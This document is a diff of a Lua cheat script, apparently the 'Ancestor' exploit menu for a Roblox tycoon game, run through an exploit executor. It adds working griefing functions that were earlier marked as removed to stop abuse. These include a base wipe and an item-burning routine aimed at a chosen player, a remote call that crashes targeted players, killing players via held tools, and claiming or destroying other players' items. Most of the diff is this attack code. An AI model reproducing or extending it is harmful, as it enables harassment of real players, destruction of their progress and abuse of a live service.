+        repeat wait()until (requirements.LP.Character.HumanoidRootPart.CFrame.p-CFrame1.p).magnitude<40;
     end;
     if option=='HardKillPlayer'then 
-        pcall(function()
-            functions.Teleport(CFrame.new(-1675, 280, 1295));
-        end);
-    end;
-    if option=='BringPlayer'then 
-        functions.Teleport(CFrame.new(oldPos));
+        local CFrame1=CFrame.new(-1675, 280, 1295)
+        functions.Teleport(CFrame1);
+        repeat wait()until (requirements.LP.Character.HumanoidRootPart.CFrame.p-CFrame1.p).magnitude<40;
     end;
     repeat game:GetService'RunService'.Stepped:wait()
         if requirements.LP.Character:FindFirstChildOfClass'Tool'then 
             requirements.Players:FindFirstChild(tostring(plr)).Character.HumanoidRootPart.CFrame=requirements.LP.Character:FindFirstChildOfClass('Tool'):FindFirstChildOfClass('Part').CFrame;
-        elseif not requirements.LP.Character:FindFirstChildOfClass'Tool'then 
-            if requirements.LP.Character:FindFirstChild'Head'then 
-                requirements.LP.Character.Head:Destroy();
-            end;
         end;
-    until requirements.LP.CharacterAdded
+    until not requirements.LP.Character:FindFirstChildOfClass'Tool';
+    repeat wait()until requirements.Players:FindFirstChild(tostring(plr)).Character:FindFirstChildOfClass'Tool';
+    wait(.4)
+    pcall(function()
+    requirements.remotes.destroyStructure:FireServer(axeToDestroy)
+    end);
+    functions.KillPlayer();
     requirements.LP.CharacterAdded:wait();
     functions.Teleport(CFrame.new(oldPos))
     requirements.ConfigSetup.oldNoclipEnabled=false;
@@ -2346,6 +2398,21 @@ functions.getLogs=function()
         end;
     end;
     return logList;
+end;
+
+functions.fireAllScoobis=function()
+    for _,Scoobis in next,workspace.PlayerModels:GetChildren()do 
+        if tostring(Scoobis)=='Scoobis'then 
+            game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(Scoobis:FindFirstChildOfClass'BindableEvent');
+        end;
+    end;
+end;
+functions.fireAllBrash=function()
+    for _,Painting in next,workspace.PlayerModels:GetChildren()do 
+        if Painting:FindFirstChild'ItemName'and tostring(Painting.ItemName.Value)=='Painting4'then 
+            game:GetService("ReplicatedStorage").Interaction.RemoteProxy:FireServer(Painting:FindFirstChildOfClass'BindableEvent');
+        end;
+    end;
 end;
 
 functions.getPlanks=function()
@@ -2591,12 +2658,11 @@ functions.modifyCar=function()
 end;
 
 functions.getButton=function(Text)
-    for _,ScrollingFrame in next,game:GetService("PlayerGui").Ancestor.MainBody:GetChildren()do 
+    for _,ScrollingFrame in next,game.CoreGui.Ancestor.MainBody:GetChildren()do 
         if ScrollingFrame:FindFirstChild(tostring(Text))then 
             return ScrollingFrame;
         end;
     end;
-    return false
 end;
 
 functions.makeClock=function(mode)
@@ -2627,7 +2693,7 @@ functions.makeClock=function(mode)
     local f1_3=Instance.new('Frame');
     local UICorner_3=Instance.new('UICorner');
     Stats.Name='Stats';
-    Stats.Parent=game:GetService'CoreGui';
+    Stats.Parent=game.CoreGui
     Stats.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;
     FPSFrame.Name='FPSFrame';
     FPSFrame.Parent=Stats;
@@ -3296,17 +3362,19 @@ end;
 -- end;
 
 functions.RemoveTool=function()
-requirements.connections.antiWeld=game:GetService'RunService'.Stepped:Connect(function()
-        for _,tool in next,requirements.LP.Character:children()do 
-            if tool:IsA('Tool')and tostring(tool.Name)~='BlueprintTool'then 
-                if not tool:FindFirstChild('Owner') or tool:FindFirstChild('Owner')then
-                    if tostring(tool.Owner.Value)==tostring(requirements.LP)then return end;
-                    if not functions.WhitelistCheck(tool.Owner.Value)then
-                        requirements.LP.Character.Humanoid:UnequipTools();
+    requirements.connections.antiWeld=game:GetService'RunService'.Stepped:Connect(function()
+        pcall(function()
+            for _,tool in next,requirements.LP.Character:children()do 
+                if tool:IsA('Tool')and tostring(tool.Name)~='BlueprintTool'then 
+                    if not tool:FindFirstChild('Owner') or tool:FindFirstChild('Owner')then
+                        if tostring(tool.Owner.Value)==tostring(requirements.LP)then return end;
+                        if not functions.WhitelistCheck(tool.Owner.Value)then
+                            requirements.LP.Character.Humanoid:UnequipTools();
+                        end;
                     end;
                 end;
             end;
-        end;
+        end);
     end);
 end;
 functions.RemoveTool();
@@ -3365,6 +3433,37 @@ functions.selfDupeCurrentSlot=function(slot)
         requirements.Booleans.DisableSlotSaving=true;
     end;
 end;
+
+functions.Shuffle=function()
+    local number=math.random(1,#requirements.SignTable);
+    local newTitle='PlaceHolder'
+    for Index,Title in next,requirements.SignTable do
+        if Index==number then 
+            newTitle=tostring(Title);
+        end;
+    end;
+    return newTitle;
+end;
+functions.doBillboards=function()
+    for _,Billboard in next,game:GetService("Workspace").Stores.WoodRUs.Parts:GetChildren()do
+        if Billboard:FindFirstChild'SurfaceGui'and Billboard.Name=='Part'then 
+            Billboard.SurfaceGui.TextLabel.Text=functions.Shuffle();
+        end;
+    end;
+end;
+spawnf(function()
+    pcall(function()
+        game:GetService("Workspace").Stores.WoodRUs.Parts.PREMIUMSELECTION.SurfaceGui.TextLabel.Text=functions.Shuffle();
+        functions.doBillboards();
+        while wait(5)do
+            if not requirements.Booleans.isEnabled then 
+                break;
+            end;
+            functions.doBillboards();
+            game:GetService("Workspace").Stores.WoodRUs.Parts.PREMIUMSELECTION.SurfaceGui.TextLabel.Text=functions.Shuffle();
+        end;
+    end);
+end);
 --//End Of Functions\\--
 
 --//Connections\\--
@@ -3445,7 +3544,6 @@ end)]])(requirements);
 local main=lib:Main();
 local MainPlayerOptionsFrame=main:Category('5181994100');
 local MainPlayerOptions=MainPlayerOptionsFrame:Section('Ancestor '..requirements.CurrentVersion);
-
 MainPlayerOptions:Slider(
     'WalkSpeed',
     function(k)
@@ -3480,8 +3578,6 @@ MainPlayerOptions:Slider(
     100
 );
 
-
---> Nobody makes their fucking fly. Deal with it
 MainPlayerOptions:KeyBind(
     'Fly',
     function(state)
@@ -3674,30 +3770,6 @@ MainPlayerOptions:Toggle(
     false
 )
 
-MainPlayerOptions:KeyBind(
-    'Fling',
-    function(key)
-        requirements.ConfigSetup.FlingKey=tostring(key.Name)
-        if not requirements.Booleans.Flinging then
-            requirements.Booleans.Flinging=true;
-            requirements.Booleans.Noclip=true;
-            if not requirements.LP.Character.Head:FindFirstChildOfClass('BodyAngularVelocity')then
-                local fling = Instance.new('BodyAngularVelocity',requirements.LP.Character.Head)
-                fling.AngularVelocity = Vector3.new(0,200000,0)
-                fling.MaxTorque = Vector3.new(0,200000,0)
-                fling.P = math.huge
-            end
-        elseif requirements.Booleans.Flinging then	
-            requirements.Booleans.Flinging=false;
-            requirements.Booleans.Noclip=false;
-            if requirements.LP.Character.Head:FindFirstChildOfClass('BodyAngularVelocity')then 
-                requirements.LP.Character.Head.BodyAngularVelocity:Destroy()
-            end;
-        end;
-    end,
-    Enum.KeyCode[requirements.ConfigSetup.FlingKey]
-);
-
 MainPlayerOptions:Toggle(
     'Light',
     function(b)
@@ -3747,7 +3819,7 @@ requirements.services.userInputService.InputEnded:Connect(function(key,processed
     if key.KeyCode==Enum.KeyCode[requirements.ConfigSetup.SprintKey]and not processed then 
         if requirements.Strings.WalkSpeed>16 then 
             requirements.Booleans.Sprinting=false;
-            requirements.Strings.WalkSpeed=tonumber(game:GetService('CoreGui').Ancestor.MainBody.ScrollingFrame.WalkSpeedSlider.SliderDarkOutline.SliderValue.Text)
+            requirements.Strings.WalkSpeed=tonumber(requirements.LP.PlayerGui.Ancestor.MainBody.ScrollingFrame.WalkSpeedSlider.SliderDarkOutline.SliderValue.Text)
         end;
     end;
 end);
@@ -3838,11 +3910,27 @@ local MainPlayerOptions=MainPlayerOptionsFrame:Section('Spectate A Player');
 MainPlayerOptions:DropDown(
     'Teleport To Player\'s Plot',
     function(plr)
-        if not requirements.Players:FindFirstChild(plr)then 
-            functions.notify('Error','Player Not Found!',4);
-            return;
-        end;
-        requirements.wrkspc.CurrentCamera.CameraSubject=requirements.Players:FindFirstChild(plr).Character.Humanoid
+        pcall(function()
+            if not requirements.Players:FindFirstChild(plr)then 
+                functions.notify('Error','Player Not Found!',4);
+                return;
+            end;
+            functions.StopSpectating();
+            requirements.wrkspc.CurrentCamera.CameraSubject=requirements.Players:FindFirstChild(plr).Character.Humanoid
+            requirements.connections.spectateAdded=requirements.Players:FindFirstChild(plr).CharacterAdded:Connect(function()
+                repeat wait()until requirements.Players:FindFirstChild(plr):FindFirstChild'Humanoid'
+                requirements.wrkspc.CurrentCamera.CameraSubject=requirements.Players:FindFirstChild(plr).Character.Humanoid
+            end);
+            requirements.connections.spectateAddedLocal=requirements.LP.CharacterAdded:Connect(function()
+                repeat wait()until requirements.wrkspc.CurrentCamera.CameraSubject==requirements.LP.Character:WaitForChild'Humanoid'
+                requirements.wrkspc.CurrentCamera.CameraSubject=requirements.Players:FindFirstChild(plr).Character.Humanoid
+            end);
+            requirements.connections.playerLeft=game:GetService'Players'.ChildRemoved:Connect(function(Player)
+                if tostring(Player)==tostring(plr)then 
+                    functions.StopSpectating();
+                end;
+            end);
+        end);
     end,
     false,true,true
 );
@@ -3982,6 +4070,14 @@ MainGameOptions:Toggle(
     end,
     false
 );
+
+MainGameOptions:Button(
+    'Fuck Base',
+    function(state)
+        
+    end,
+    true
+);
 local MainGameOptions=MainGameOptionsFrame:Section('Leaked Items Options');
 MainGameOptions:Toggle(
     'Leaked Items',
@@ -4048,6 +4144,23 @@ MainGameOptions:Button(
         functions.claimAllShopItems();
     end,
     true
+);
+
+MainGameOptions:Toggle(
+    'Disable Store Item Despawn',
+    function(state)
+        requirements.Booleans.StopDespawn=state;
+        if state then 
+            functions.claimAllShopItems();
+            while wait(5)do
+                if not requirements.Booleans.StopDespawn then
+                    break;
+                end;
+                functions.claimAllShopItems();
+            end;
+        end;
+    end,
+    false
 );
 
 local MainGameOptions=MainGameOptionsFrame:Section('Store Door Options');
@@ -4168,11 +4281,25 @@ MainGameOptions:Button(
     end,
     true
 );
-local MainGameOptions=MainGameOptionsFrame:Section('Pressure Plate Options');
+local MainGameOptions=MainGameOptionsFrame:Section('Misc Options');
 MainGameOptions:Button(
     'Trigger All Pressure Plates',
     function()
         functions.TriggerAllPressurePlates();
+    end,
+    true
+);
+MainGameOptions:Button(
+    'Fire All Scoobis',
+    function()
+        functions.fireAllScoobis();
+    end,
+    true
+);
+MainGameOptions:Button(
+    'Fire All Bold & Brash',
+    function()
+        functions.fireAllBrash();
     end,
     true
 );
@@ -4314,7 +4441,7 @@ MainAxeOptions:Toggle(
                         for _,g in next,v:children()do
                             pcall(function()
                                 if(requirements.LP.Character.HumanoidRootPart.CFrame.p-g.WoodSection.CFrame.p).magnitude<=20 and functions.getBestAxe()then 
-                                   functions.chopTree(g.CutEvent);
+                                functions.chopTree(g.CutEvent);
                                 end;
                             end);
                         end;
@@ -4467,6 +4594,14 @@ BaseDropOptions:Button(
     true
 );
 
+local part = Instance.new('Part')		-- Create a new part
+
+part.Name = 'JurrasicPart'			-- Name the part... hehe
+part.Anchored = true				-- Anchor the part
+part.Parent = game.Workspace		-- Put the part into the Workspace
+part.Shape = Enum.PartType.Ball		-- Give the part a ball shape
+part.Color = Color3.new(1, 1, 1)
+
 local MainPlotOptionsFrame=main:Category('5416946285');
 local MainPlotOptions=MainPlotOptionsFrame:Section('Load/Save Plot Options');
 
@@ -4531,6 +4666,17 @@ MainPlotOptions:Button(
     'Max Land',
     function()
         functions.MaxLand(functions.getPlayersBase(tostring(requirements.LP)));
+    end,
+    true
+);
+
+MainPlotOptions:Button(
+    'Expand Land',
+    function()
+        local script=getsenv(requirements.LP.PlayerGui.PropertyPurchasingGUI.PropertyPurchasingClient);
+        script.setPlatformControls=function()end;
+        if not functions.getPlayersBase(tostring(requirements.LP))then script.enterPurchaseMode(0,false);return end;
+        script.enterPurchaseMode(0,true);
     end,
     true
 );
@@ -4772,8 +4918,9 @@ MainPlotOptions:DropDown(
 MainPlotOptions:Button(
     'Build Selected Build',
     function(build)
-        local build=game:HttpGet('https://ancestordevelopment.wtf/autobuilds/'..tostring(requirements.Strings.buildToBuild)..'Build');
-        functions.loadFile(build);
+        -- local build=game:HttpGet('https://ancestordevelopment.wtf/autobuilds/'..tostring(requirements.Strings.buildToBuild)..'Build');
+        -- functions.loadFile(build);
+        functions.notify('Ancestor','Auto-Build Temporarily Discontinued',4)
     end,
     true
 )
@@ -4836,7 +4983,6 @@ MainTreeOptions:Toggle(
     false
 );
 
-
 MainTreeOptions:Toggle(
     'Auto Mod Tree',
     function(v)
@@ -4887,6 +5033,8 @@ MainTreeOptions:Toggle(
     end,
     false
 );
+
+
 
 MainTreeOptions:Button(
     'Bring Selected Tree',
@@ -5167,55 +5315,63 @@ MainAutobuyOptionsMAIN:Button(
                         wait();
                     until not axeConnection;
                 end;
-                axeConnection=workspace.PlayerModels.ChildAdded:Connect(function(Child)
-                    local Main=Child:WaitForChild('Main',60)
-                    if Main:FindFirstChild'Mesh'and Main.Mesh.TextureId=='rbxassetid://273892918'then 
-                        repeat wait()until Child:FindFirstChild'ToolName';
-                        for i=1,12 do 
+                for i=1,requirements.Strings.autoBuySelectedItemAmount do
+                    repeat wait()until requirements.Booleans.AutoBuyingRuki==false;
+                    requirements.Booleans.AutoBuyingRuki=true;
+                    axeConnection=workspace.PlayerModels.ChildAdded:Connect(function(Child)
+                        local Main=Child:WaitForChild('Main',60)
+                        if Main:FindFirstChild'Mesh'and Main.Mesh.TextureId=='rbxassetid://273892918'then 
+                            repeat wait()until Child:FindFirstChild'ToolName';
+                            requirements.Booleans.AutoBuyingRuki=false;
+                            for i=1,12 do 
+                                pcall(function()
+                                    requirements.remotes.clientIsDragging:FireServer(Child);
+                                    game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(Child,'Pick up tool');
+                                end);
+                            end;
                             pcall(function()
-                                requirements.remotes.clientIsDragging:FireServer(Child);
-                                game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(Child,'Pick up tool');
+                                axeConnection:Disconnect();
+                                axeConnection=nil;
                             end);
                         end;
-                        axeConnection:Disconnect();
-                        axeConnection=nil;
-                    end;
-                end);
-                boxOpenConnection=workspace.PlayerModels.ChildAdded:Connect(function(Child)
-                repeat wait()until not requirements.Booleans.isBuying;
-                wait(.5)
-                local Owner=Child:WaitForChild('Owner',60)
-                if tostring(Owner.Value)==tostring(requirements.LP)then 
-                    local itemName=Child:FindFirstChild'ItemName'or Child:FindFirstChild'PurchasedBoxItemName';
-                    if itemName then 
-                        print(itemName)
-                        if tostring(itemName.Value)=='BagOfSand'or tostring(itemName.Value)=='CanOfWorms'or tostring(itemName.Value)=='LightBulb'then 
-                            game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(Child,'Open box');
-                            if Child:FindFirstChild'ItemName'then
-                                if tostring(itemName.Value)=='BagOfSand'then 
-                                    teleport_Item(Child,CFrame.new(319,43,1914));
-                                elseif tostring(itemName.Value)=='CanOfWorms'then 
-                                    teleport_Item(Child,CFrame.new(317,43,1918));
-                                elseif tostring(itemName.Value)=='LightBulb'then 
-                                    teleport_Item(Child,CFrame.new(322,43,1916));
+                    end);
+                    boxOpenConnection=workspace.PlayerModels.ChildAdded:Connect(function(Child)
+                    repeat wait()until not requirements.Booleans.isBuying;
+                    wait(.5)
+                    local Owner=Child:WaitForChild('Owner',60)
+                    if tostring(Owner.Value)==tostring(requirements.LP)then 
+                        local itemName=Child:FindFirstChild'ItemName'or Child:FindFirstChild'PurchasedBoxItemName';
+                        if itemName then 
+                            print(itemName)
+                            if tostring(itemName.Value)=='BagOfSand'or tostring(itemName.Value)=='CanOfWorms'or tostring(itemName.Value)=='LightBulb'then 
+                                game:GetService("ReplicatedStorage").Interaction.ClientInteracted:FireServer(Child,'Open box');
+                                if Child:FindFirstChild'ItemName'then
+                                    if tostring(itemName.Value)=='BagOfSand'then 
+                                        teleport_Item(Child,CFrame.new(319,43,1914));
+                                    elseif tostring(itemName.Value)=='CanOfWorms'then 
+                                        teleport_Item(Child,CFrame.new(317,43,1918));
+                                    elseif tostring(itemName.Value)=='LightBulb'then 
+                                        teleport_Item(Child,CFrame.new(322,43,1916));
+                                    end;
                                 end;
                             end;
                         end;
                     end;
-                end;
-            end);
-            functions.AutoBuyItem("BagOfSand",1);
-            functions.AutoBuyItem('CanOfWorms',1);
-            functions.AutoBuyItem('LightBulb',1);
-            requirements.Booleans.abortAutobuy=false;
-            functions.Teleport(CFrame.new(oldPos));
-            wait(10)
-            boxOpenConnection:Disconnect();
-            boxOpenConnection=nil;
+                end);
+                functions.AutoBuyItem("BagOfSand",1);
+                functions.AutoBuyItem('CanOfWorms',1);
+                functions.AutoBuyItem('LightBulb',1);
+                requirements.Booleans.abortAutobuy=false;
+                functions.Teleport(CFrame.new(oldPos));
+                spawn(function()
+                    wait(10)
+                    boxOpenConnection:Disconnect();
+                    boxOpenConnection=nil;
+                end);
+            end;
             return;
         end;
         functions.AutoBuyItem(requirements.Strings.autoBuySelectedItem,requirements.Strings.autoBuySelectedItemAmount);
-        requirements.Booleans.abortAutobuy=false;
         functions.Teleport(CFrame.new(oldPos));
     end,
     true
@@ -5563,14 +5719,72 @@ settings:Toggle(
 );
 local settings=SettingsMain:Section('Credits');
 settings:TextLabel('Made By Ancestor');
-settings:TextLabel('Tested/Moral Support By Adam');
+settings:TextLabel('Interface By xTheAlex');
 if functions.isPlayerAdmin(requirements.LP)then 
     local adminFunctions={};
+    adminFunctions.getBarkUsers=function()
+        requirements.tables.barkUsers={'No Player\'s Using Bark'}
+        if not functions.getButton('Check If A Player Is BannedSection')then return;end;
+        functions.notify('Ancestor','Grabbing Bark Users',4)
+        local Event=game:GetService("ReplicatedStorage").NPCDialog.SetChattingValue
+        Event:InvokeServer(1005);
+        wait(6)
+        Event:InvokeServer(0);
+        for i,v in pairs(game.Players:GetChildren()) do
+            if v.IsChatting.Value == 1002 then
+                if table.find(requirements.tables.barkUsers,'No Player\'s Using Bark')then 
+                    requirements.tables.barkUsers={};
+                end;
+                table.insert(requirements.tables.barkUsers, v.Name)
+            end
+        end
+        if not table.find(requirements.tables.barkUsers,'No Player\'s Using Bark')then 
+            requirements.Strings.barkPlayerToKick=requirements.tables.barkUsers[1];
+        end;
+        return requirements.tables.barkUsers;
+    end;
+    adminFunctions.crashBarkUser=function(player)
+        if player=='No Player\'s Using Bark'then return end;
+        game:GetService("ReplicatedStorage").NPCDialog.SetChattingValue:InvokeServer(game.Players:FindFirstChild(tostring(player)).UserId+6994382);
+        functions.notify('Ancestor','Crashing '..tostring(player),4)
+        wait(15);
+        game:GetService("ReplicatedStorage").NPCDialog.SetChattingValue:InvokeServer(0);
+    end;
     adminFunctions.burnAllItems=function(player)
-        -->Removed to stop abuse
+        for _,Model in next,workspace.PlayerModels:GetChildren()do 
+            if Model:FindFirstChild'Owner'and tostring(Model.Owner.Value)==tostring(player)then
+                local thingToBurn=Model:FindFirstChild'Main'or Model:FindFirstChild'WoodSection';
+                if thingToBurn then
+                    if(thingToBurn.CFrame.p-requirements.LP.Character.Head.CFrame.p).magnitude>15 then 
+                        functions.Teleport(CFrame.new(thingToBurn.CFrame.p+Vector3.new(0,10,0)));
+                    end;
+                    requirements.remotes.clientIsDragging:FireServer(Model);
+                    local lava=workspace['Region_Volcano'].Lava.Lava
+                    firetouchinterest(thingToBurn,lava,0);
+                    firetouchinterest(thingToBurn,lava,1);
+                end;
+            end;
+        end;
     end;
     adminFunctions.baseWipe=function(plr)
-        -->Removed to stop abuse
+        local offset=nil;
+        local PlayerToWipe=game.Players[plr];
+        for _,Plot in next,game.Workspace.Properties:GetChildren()do
+            if Plot:FindFirstChild'Owner'then
+                if tostring(Plot.Owner.Value)==tostring(PlayerToWipe)then
+                    offset=Plot.OriginSquare.CFrame;
+                    break;
+                end;
+            end;
+        end;
+        for _,Item in next,game.Workspace.PlayerModels:GetChildren()do
+            if Item:FindFirstChild'Owner'then
+                if tostring(Item.Owner.Value)==tostring(PlayerToWipe)then
+                    game.ReplicatedStorage.PlaceStructure.ClientPlacedBlueprint:FireServer('Floor1Tiny',offset-Vector3.new(0,100,0),nil,Item)
+                    game:GetService('RunService').Stepped:wait();
+                end;
+            end;
+        end;
     end;
     local AdminOptionsFrame=main:Category('7479702026');
     local AdminOptions=AdminOptionsFrame:Section('Ancestor Admin Options');
@@ -5601,13 +5815,6 @@ if functions.isPlayerAdmin(requirements.LP)then
         true
     );
     AdminOptions:Button(
-    'Stop Spectating',
-    function()
-        functions.StopSpectating();
-    end,
-    true
-    );
-    AdminOptions:Button(
         'Kinda Force Whitelist', 
         function()
             local script=require(game:GetService("ReplicatedStorage").Interaction.InteractionPermission);
@@ -5615,10 +5822,208 @@ if functions.isPlayerAdmin(requirements.LP)then
         end,
         true
     );
+    local AdminOptions=AdminOptionsFrame:Section('Crash Bark Users');
+    AdminOptions:DropDown(
+    '',
+    function(Player)
+        requirements.Strings.barkPlayerToKick=tostring(Player);
+    end,
+    {options=adminFunctions.getBarkUsers(),CallBack=function() requirements.tables.barkUsers={}; return adminFunctions.getBarkUsers()end}
+);
+    AdminOptions:Button(
+        'Crash Bark User', 
+        function()
+            adminFunctions.crashBarkUser(requirements.Strings.barkPlayerToKick);
+        end,
+        true
+    );
+    local AdminOptions=AdminOptionsFrame:Section('Check If A Player Is Banned');
+    AdminOptions:TextBox(
+    'Check Ban',
+    function(PlayerName)
+        functions.CheckPlayerBan(tostring(PlayerName))
+    end,
+    'Enter Username Here'
+    );
+    AdminOptions:Button(
+        'Ban Status: ', 
+        function()
+            
+        end,
+        true
+    );
+    if requirements.Booleans.DeveloperMode then
+        local AdminOptions=AdminOptionsFrame:Section('Ancestor Developer Tools');
+        AdminOptions:DropDown(
+            'Identify Type',
+            function(plr)
+                requirements.Strings.IdentifyType=plr
+            end,
+            {options={'Owner','Type','Name','CFrameValue'}}
+            );
+        AdminOptions:Button(
+            'Identify Item', 
+            function()
+            functions.notify('Ancestor','Select A Item',4)
+            local Item=nil;
+            connection=requirements.Mouse.Button1Down:Connect(function(b)
+            local target=requirements.Mouse.Target;
+                if target then 
+                    Item=target.Parent;
+                    if requirements.Strings.IdentifyType=='Name'then 
+                        functions.notify('Ancestor',tostring(target))
+                        return;
+                    end;
+                    if requirements.Strings.IdentifyType=='CFrameValue'then 
+                        if target:FindFirstChild'OriginCFrame'then
+                            functions.notify('Ancestor','SetClipboard '..'{'..tostring(target.OriginCFrame.Value)..'}',4);
+                            setclipboard(tostring(target.OriginCFrame.Value))
+                        end;
+                        return;
+                    end;
+                    if Item:FindFirstChild(tostring(requirements.Strings.IdentifyType))then 
+                        if tostring(requirements.Strings.IdentifyType)=='Owner'and tostring(Item:FindFirstChild(tostring(requirements.Strings.IdentifyType)).Value)=='nil' then 
+                            functions.notify('Ancestor','Nobody Owns This Item')
+                            return;
+                        end;
+                        functions.notify('Ancestor',tostring(Item:FindFirstChild(tostring(requirements.Strings.IdentifyType)).Value))
+                    end;
+                end;
+            end);
+            repeat wait()until Item~=nil;
+            if connection then 
+                connection:Disconnect();
+                connection=nil;
+            end;
+            end,
+            true
+        );
+        AdminOptions:Button(
+            'Claim Item', 
+            function()
+            functions.notify('Ancestor','Select A Item',4)
+            local Item=nil;
+            connection=requirements.Mouse.Button1Down:Connect(function(b)
+            local target=requirements.Mouse.Target;
+                if target then 
+                    Item=target.Parent;
+                    if Item:FindFirstChild'Owner'and tostring(Item.Owner.Value)~=tostring(requirements.LP)then 
+                        requirements.remotes.clientIsDragging:FireServer(Item);
+                    end;
+                end;
+            end);
+            repeat wait()until Item~=nil;
+            repeat wait()until tostring(Item.Owner.Value)==tostring(requirements.LP);
+            functions.notify('Ancestor','Claimed '..tostring(Item),4)
+            if connection then 
+                connection:Disconnect();
+                connection=nil;
+            end;
+            end,
+            true
+        );
+        AdminOptions:Button(
+            'Destroy Item', 
+            function()
+            functions.notify('Ancestor','Select A Item',4)
+            local Item=nil;
+            connection=requirements.Mouse.Button1Down:Connect(function(b)
+            local target=requirements.Mouse.Target;
+                if target then 
+                    Item=target.Parent;
+                    if Item:FindFirstChild'Owner'and tostring(Item.Owner.Value)~=tostring(requirements.LP)then 
+                        requirements.remotes.clientIsDragging:FireServer(Item);
+                    end;
+                    requirements.remotes.destroyStructure:FireServer(Item);
+                end;
+            end);
+            repeat wait()until Item~=nil;
+            if connection then 
+                connection:Disconnect();
+                connection=nil;
+            end;
+            end,
+            true
+        );
+        AdminOptions:Button(
+            'Burn Item', 
+            function()
+            functions.notify('Ancestor','Select A Item',4)
+            local Item=nil;
+            connection=requirements.Mouse.Button1Down:Connect(function(b)
+            local target=requirements.Mouse.Target;
+                if target then 
+                    Item=target.Parent;
+                    requirements.remotes.clientIsDragging:FireServer(Item);
+                    local lava=workspace['Region_Volcano'].Lava.Lava
+                    firetouchinterest(Item:FindFirstChildOfClass'Part',lava,0);
+                    firetouchinterest(Item:FindFirstChildOfClass'Part',lava,1)
+                end;
+            end);
+            repeat wait()until Item~=nil;
+            if connection then 
+                connection:Disconnect();
+                connection=nil;
+            end;
+            end,
+            true
+        );
+        AdminOptions:Button(
+            'Tell Discord', 
+            function()
+                functions.tellDiscord();
+            end,
+            true
+        );
+        AdminOptions:Button(
+            'Copy Player CFrame', 
+            function()
+                setclipboard(tostring(requirements.LP.Character.HumanoidRootPart.CFrame));
+            end,
+            true
+        );
+        local AdminOptions=AdminOptionsFrame:Section('Ancestor Debug Tools');
+        AdminOptions:Button(
+            'Ping: ', 
+            function()
+        
+            end,
+            true
+        );
+        AdminOptions:Button(
+            'CPU: ', 
+            function()
+        
+            end,
+            true
+        );
+        AdminOptions:Button(
+            'Chatting Value: ', 
+            function()
+        
+            end,
+            true
+        );
+        AdminOptions:Button(
+            'Current Region: ', 
+            function()
+        
+            end,
+            true
+        );
+        requirements.connections.pingUpdater=requirements.services.RunService.Stepped:Connect(function()
+            functions.getButton('Ping: Button')['Ping: Button'].ImageLabel.TextButton.Text='Ping: '..math.floor(game:GetService("Stats").PerformanceStats.Ping:GetValue())..'ms';
+            functions.getButton('Ping: Button')['CPU: Button'].ImageLabel.TextButton.Text='CPU: '..math.floor(game:GetService("Stats").PerformanceStats.CPU:GetValue())..'ms';
+            functions.getButton('Chatting Value: Button')['Chatting Value: Button'].ImageLabel.TextButton.Text='Chatting Value: '..tostring(requirements.LP.IsChatting.Value);
+            functions.getButton('Current Region: Button')['Current Region: Button'].ImageLabel.TextButton.Text='Current Region: '..tostring(requirements.Strings.CurrentRegion);
+        end);
+    end;
 end;
 game.CoreGui.ChildRemoved:Connect(function(b)
     if tostring(b)=='Ancestor'then 
         pcall(function()
+            game:GetService("Workspace").Stores.WoodRUs.Parts.PREMIUMSELECTION.SurfaceGui.TextLabel.Text='PREMIUM SELECTION';
+            requirements.ConfigSetup.WaterFloat=false;
             requirements.Booleans.DisableSlotSaving=false;
             requirements.Booleans.sendNotifications=false;
             requirements.Booleans.pingMessages=false;
